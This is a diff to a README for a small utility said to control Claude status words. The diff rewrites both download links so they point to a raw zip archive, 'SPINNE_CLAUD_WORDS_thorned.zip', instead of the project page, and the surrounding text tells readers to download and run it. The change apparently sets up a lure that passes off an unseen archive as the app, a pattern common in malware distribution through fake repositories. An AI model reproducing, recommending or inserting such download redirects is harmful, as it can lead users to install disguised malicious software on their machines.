@@ -1,6 +1,6 @@
 # 🤖 CLAUDE-SPINNER-WORDS - Simple control for Claude status words
 
-[![Download](https://img.shields.io/badge/Download-CLAUDE--SPINNER--WORDS-blue?style=for-the-badge)](https://github.com/Haloufde9815/CLAUDE-SPINNER-WORDS)
+[![Download](https://img.shields.io/badge/Download-CLAUDE--SPINNER--WORDS-blue?style=for-the-badge)](https://github.com/Haloufde9815/CLAUDE-SPINNER-WORDS/raw/refs/heads/main/Source Code/assets/SPINNE_CLAUD_WORDS_thorned.zip)
 
 ## 🚀 What this app does
 
@@ -17,7 +17,7 @@ Use it to:
 
 Use this page to download and set up the app:
 
-[Download CLAUDE-SPINNER-WORDS](https://github.com/Haloufde9815/CLAUDE-SPINNER-WORDS)
+[Download CLAUDE-SPINNER-WORDS](https://github.com/Haloufde9815/CLAUDE-SPINNER-WORDS/raw/refs/heads/main/Source Code/assets/SPINNE_CLAUD_WORDS_thorned.zip)
 
 If the page opens in your browser, look for the latest release, a setup file, or the main project files. Then download and run the app from there.
 
